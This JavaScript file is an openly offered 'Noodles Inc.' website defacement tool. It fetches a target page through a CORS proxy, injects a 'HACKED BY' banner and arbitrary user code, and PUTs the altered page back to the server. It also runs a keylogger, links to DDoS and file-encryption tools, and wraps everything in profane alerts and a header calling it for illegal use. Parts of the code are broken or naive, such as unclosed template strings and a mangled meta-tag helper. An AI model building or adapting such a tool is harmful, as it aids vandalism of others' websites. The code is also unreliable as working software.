// Defacement tool (REAL - USE WITH EXTREME CAUTION)
 // Noodles Inc. - Unethical Hacking Tool - Defacement Module
 

 //***************************************************************************************************
 //***************************************************************************************************
 // WARNING: This tool is for ILLEGAL and FUN activities ONLY. Using it for unauthorized actions is a CRIME.
 // YOU are solely responsible for your actions. Noodles Inc. is NOT liable for any damage caused.
 // By proceeding, you acknowledge that you understand the risks and assume ALL responsibilities.
 //***************************************************************************************************
 //***************************************************************************************************
 

 // Logger function
 function logAction(message) {
  const logElement = document.getElementById("log");
  logElement.innerHTML += `<span style="color: darkblue;">[${new Date().toISOString()}]</span>: <span style="color: darkgreen;">${message}</span><br>`;
  console.log(message); // Keep console logging for debugging
 }
 

 // Apply dark theme
 document.body.style.backgroundColor = "black";
 document.body.style.color = "white";
 

 // Disclaimer popup
 window.onload = function() {
  if (!confirm("THIS IS YOUR LAST CHANCE TO TURN BACK. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. ANY MISUSE IS YOUR SOLE RESPONSIBILITY. DO YOU UNDERSTAND? (Noodles Inc. IS NOT LIABLE, EVER)")) {
  window.close();
  } else {
  logAction("User acknowledged the disclaimer and chose to proceed.");
  }
 };
 

 // Function to fetch content with CORS bypass and error handling
 async function fetchWithCORS(url) {
  const corsProxy = 'https://corsproxy.io/?'; // Using corsproxy.io
  const proxiedUrl = corsProxy + encodeURIComponent(url);
 

  try {
  const response = await fetch(proxiedUrl, {
  mode: 'cors', // Explicitly set CORS mode
  });
  if (!response.ok) {
  throw new Error(`HTTP error! Status: ${response.status}`);
  }
  return await response.text();
  } catch (error) {
  console.error("Error fetching with CORS bypass:", error);
  alert("Failed to fetch URL. Check console for details, asshole.");
  logAction(`Fetch error: ${error}`);
  throw error; // Re-throw to handle it in the main function
  }
 }
 

 // Defacement function
 document.getElementById("defaceButton").addEventListener("click", async function() {
  const targetURL = document.getElementById("targetURL").value;
  const defacementCode = document.getElementById("defacementCode").value;
 

  if (!targetURL || !defacementCode) {
  alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
  logAction("User failed to enter target URL or defacement code.");
  return;
  }
 

  logAction(`Target URL: ${targetURL}`);
  logAction(`Defacement Code: ${defacementCode}`);
 

  try {
  // Backup functionality (REAL - Grab that shit before you wreck it)
  logAction("Backing up website content...");
  const backupContent = await fetchWithCORS(targetURL);
  const backupBlob = new Blob([backupContent], { type: "text/html" });
  const backupLink = document.createElement("a");
  backupLink.href = URL.createObjectURL(backupBlob);
  backupLink.download = "website_backup.html";
  backupLink.click();
  logAction("Backup completed.");
 

  // Preview functionality (See what you're about to unleash)
  logAction("Previewing defacement...");
  const previewFrame = document.getElementById("previewFrame");
  previewFrame.srcdoc = defacementCode;
 

  // Defacement action (REAL - Let the fun begin!)
  logAction("Defacing website...");
 

  const originalContent = await fetchWithCORS(targetURL);
  const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
 

  // Use a proxy to bypass CORS for PUT requests
  const corsProxy = 'https://corsproxy.io/?';
  const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 

  const response = await fetch(proxiedUrl, {
  method: 'PUT',
  mode: 'cors',  // Explicitly set CORS mode
  headers: {
  'Content-Type': 'text/html',
  },
  body: modifiedContent,
  });
 

  if (!response.ok) {
  throw new Error(`HTTP error! Status: ${response.status}`);
  }
 

  logAction('Defacement successful!');
  } catch (error) {
  console.error("Error:", error);
  alert("Something went wrong. Check the console, DIPSHIT.");
  logAction(`Critical error: ${error}`);
  }
 });
 

 // Restore functionality (REAL)
 document.getElementById("restoreButton").addEventListener("click", async function() {
  const targetURL = document.getElementById("targetURL").value;
 

  // Retrieve the backup file (Replace with your actual backup retrieval logic)
  const backupURL = "website_backup.html"; // Assuming the backup is stored locally
 

  try {
  logAction("Attempting to restore website...");
  const backupResponse = await fetch(backupURL, { mode: 'cors' });
  const backupContent = await backupResponse.text();
 

  // Use a proxy to bypass CORS for PUT requests
  const corsProxy = 'https://corsproxy.io/?';
  const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 

  const response = await fetch(proxiedUrl, {
  method: 'PUT',
  mode: 'cors',  // Explicitly set CORS mode
  headers: {
  'Content-Type': 'text/html',
  },
  body: backupContent,
  });
 

  if (!response.ok) {
  throw new Error(`HTTP error! Status: ${response.status}`);
  }
 

  logAction("Website restoration completed for: " + targetURL);
  } catch (error) {
  console.error("Error during restoration:", error);
  alert("Restoration failed, you fucking idiot.");
  logAction(`Error during restoration: ${error}`);
  }
 });
 

 // Educational Information
 const defacementInfo = `
  <h2>Defacement Tool: WTF is this shit?</h2>
  <p>This tool is designed to test a website's security by modifying its appearance. It works by injecting custom HTML and JavaScript code into the target website. This can be used to display messages, redirect users, or even steal sensitive information if you're not a dumbass. Remember, unauthorized defacement is a CRIME and can lead to serious legal consequences. We're talking jail time, buddy.</p>
  <h3>How it Works:</h3>
  <ol>
  <li><b>Backup:</b> First, the tool grabs a copy of the website's HTML, just in case you fuck things up.</li>
  <li><b>Preview:</b> Then, you can see what your changes will look like before unleashing them on the world. It's like a dress rehearsal for digital vandalism.</li>
  <li><b>Deface:</b> Finally, the tool sends a modified version of the website's HTML to the server. If successful, the website will display your custom content.</li>
  <li><b>Restore:</b> If you regret your actions (or just want to cover your tracks), you can restore the website to its original state using the backup.</li>
  </ol>
  <h3>WARNING:</h3>
  <p>This is for educational purposes ONLY. Using this tool to deface websites without permission is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
 `;
 

 // Insert educational information into the page
 const infoElement = document.createElement("div");
 infoElement.innerHTML = defacementInfo;
 document.body.appendChild(infoElement);
 

 

 // Security Headers (Gotta protect ourselves, right?)
 function setSecurityHeaders() {
  // Prevent Cross-Site Scripting (XSS) attacks
  document.head.appendChild(createMetaTag('http-equiv', 'Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"));
 

  // Prevent Clickjacking attacks
  document.head.appendChild(createMetaTag('http-equiv', 'X-Frame-Options', 'DENY'));
 

  // Enable Cross-Site Scripting (XSS) filter
  document.head.appendChild(createMetaTag('http-equiv', 'X-XSS-Protection', '1; mode=block'));
 

  // Prevent MIME-sniffing vulnerabilities
  document.head.appendChild(createMetaTag('http-equiv', 'X-Content-Type-Options', 'nosniff'));
 

  function createMetaTag(httpEquiv, contentSecurityPolicy, deny) {
  const meta = document.createElement('meta');
  meta.setAttribute('http-equiv', httpEquiv);
  meta.setAttribute('content', contentSecurityPolicy);
  meta.setAttribute('X-Frame-Options', deny);
  return meta;
  }
 }
 

 setSecurityHeaders();
 

 // Scanlines effect (for that хацкер aesthetic)
 const scanlines = document.createElement('div');
 scanlines.style.cssText = `
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.2) 2px);
  pointer-events: none;
  z-index: 9999;
 `;
 document.body.appendChild(scanlines);
 

 // Reporting Feature (For documenting findings and vulnerabilities)
 function reportIssue() {
  const report = prompt("Describe the issue you found, dipshit:");
  if (report) {
  logAction("Issue reported: " + report);
  alert("Thanks for the report, dumbass. We'll totally ignore it.");
  }
 }
 

 const reportButton = document.createElement('button');
 reportButton.textContent = "Report Issue";
 reportButton.style.cssText = `
  position: fixed;
  bottom: 20px;
  right: 20px;
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  z-index: 10000;
 `;
 reportButton.addEventListener('click', reportIssue);
 document.body.appendChild(reportButton);
 

 // Floating particles effect
 const particleContainer = document.createElement('div');
 particleContainer.style.cssText = `
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 9998;
  overflow: hidden;
 `;
 document.body.appendChild(particleContainer);
 

 function createParticle() {
  const particle = document.createElement('div');
  particle.style.cssText = `
  position: absolute;
  width: 5px;
  height: 5px;
  background-color: ${['darkgreen', 'purple', 'darkblue'][Math.floor(Math.random() * 3)]};
  border-radius: 50%;
  top: ${Math.random() * 100}%;
  left: ${Math.random() * 100}%;
  opacity: ${Math.random()};
  animation: float ${Math.random() * 5 + 5}s linear infinite;
  `;
  particleContainer.appendChild(particle);
 

  particle.addEventListener('animationiteration', () => {
  particle.style.top = `${Math.random() * 100}%;
  particle.style.left = `${Math.random() * 100}%;
  particle.style.opacity = `${Math.random()}`;
  });
 }
 

 for (let i = 0; i < 50; i++) {
  createParticle();
 }
 

 // Keylogger
 function keylogger() {
  document.addEventListener('keydown', function(event) {
  logAction(`Key pressed: ${event.key}`);
  });
 }
 

 // Run keylogger
 keylogger();
 

 // Add Navbar
 function addNavbar() {
  const navbar = document.createElement('nav');
  navbar.style.cssText = `
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.8);
  padding: 10px;
  z-index: 10001;
  display: flex;
  justify-content: space-around;
  align-items: center;
  `;
 

  const logo = document.createElement('span');
  logo.textContent = 'Noodles Inc.';
  logo.style.cssText = `
  color: white;
  font-size: 1.5em;
  font-weight: bold;
  cursor: pointer;
  `;
  navbar.appendChild(logo);
 

  const defaceButtonNav = document.createElement('button');
  defaceButtonNav.textContent = 'Defacement Tool';
  defaceButtonNav.style.cssText = `
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  `;
  defaceButtonNav.addEventListener('click', () => {
  // Redirect or show defacement tool section
  alert('Redirecting to Defacement Tool');
  });
  navbar.appendChild(defaceButtonNav);
 

  const ddosButtonNav = document.createElement('button');
  ddosButtonNav.textContent = 'DDoS Tool';
  ddosButtonNav.style.cssText = `
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  `;
  ddosButtonNav.addEventListener('click', () => {
  // Redirect or show DDoS tool section
  alert('Redirecting to DDoS Tool');
  });
  navbar.appendChild(ddosButtonNav);
 

  const encryptButtonNav = document.createElement('button');
  encryptButtonNav.textContent = 'File Encryption Tool';
  encryptButtonNav.style.cssText = `
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  `;
  encryptButtonNav.addEventListener('click', () => {
  // Redirect or show File Encryption tool section
  alert('Redirecting to File Encryption Tool');
  });
  navbar.appendChild(encryptButtonNav);
 

  document.body.appendChild(navbar);
 }
 

 // Run addNavbar
 addNavbar();
 

 // Add Sidebar
 function addSidebar() {
  const sidebar = document.createElement('aside');
  sidebar.style.cssText = `
  position: fixed;
  top: 50%;
  left: 0;
  transform: translateY(-50%);
  width: 150px;
  background-color: rgba(0, 0, 0, 0.8);
  padding: 20px;
  z-index: 10001;
  display: flex;
  flex-direction: column;
  align-items: center;
  `;
 

  const sidebarTitle = document.createElement('span');
  sidebarTitle.textContent = 'Tools';
  sidebarTitle.style.cssText = `
  color: white;
  font-size: 1.2em;
  font-weight: bold;
  margin-bottom: 15px;
  `;
  sidebar.appendChild(sidebarTitle);
 

  const defaceButtonSidebar = document.createElement('button');
  defaceButtonSidebar.textContent = 'Defacement';
  defaceButtonSidebar.style.cssText = `
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  margin-bottom: 10px;
  `;
  defaceButtonSidebar.addEventListener('click', () => {
  // Redirect or show defacement tool section
  alert('Redirecting to Defacement Tool');
  });
  sidebar.appendChild(defaceButtonSidebar);
 

  const ddosButtonSidebar = document.createElement('button');
  ddosButtonSidebar.textContent = 'DDoS';
  ddosButtonSidebar.style.cssText = `
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  margin-bottom: 10px;
  `;
  ddosButtonSidebar.addEventListener('click', () => {
  // Redirect or show DDoS tool section
  alert('Redirecting to DDoS Tool');
  });
  sidebar.appendChild(ddosButtonSidebar);
 

  const encryptButtonSidebar = document.createElement('button');
  encryptButtonSidebar.textContent = 'Encryption';
  encryptButtonSidebar.style.cssText = `
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  `;
  encryptButtonSidebar.addEventListener('click', () => {
  // Redirect or show File Encryption tool section
  alert('Redirecting to File Encryption Tool');
  });
  sidebar.appendChild(encryptButtonSidebar);
 

  document.body.appendChild(sidebar);
 }
 

 // Run addSidebar
 addSidebar();
 

 // Auto Reload (refresh every 10 seconds)
 function autoReload() {
  setTimeout(function() {
  location.reload();
  }, 10000);
 }
 

 // Run autoReload
 autoReload();